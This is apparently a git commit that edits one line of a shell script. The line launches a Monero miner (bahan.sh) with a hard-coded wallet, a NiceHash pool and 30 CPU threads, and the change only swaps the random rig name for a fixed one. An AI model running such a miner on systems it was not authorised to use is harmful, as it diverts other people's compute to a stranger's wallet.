9fe1b1a7c07f677a7e8ca306c912fbb919df0f9e
renilo <88342640+renilo@users.noreply.github.com>
2021-10-02 00:43:34 +0700

    Update xhajar.sh

--- xhajar.sh
+++ xhajar.sh
@@ -1,1 +1,1 @@
-./bahan.sh -algo randomx -coin XMR -wallet 3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk -rigName  $(echo $(shuf -i 1-9999 -n 1)-HAJAR) -pool1 randomxmonero.usa-west.nicehash.com:3380 -cpuThreads 30
+./bahan.sh -algo randomx -coin XMR -wallet 3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk -rigName  RANDOMX -pool1 randomxmonero.usa-west.nicehash.com:3380 -cpuThreads 30
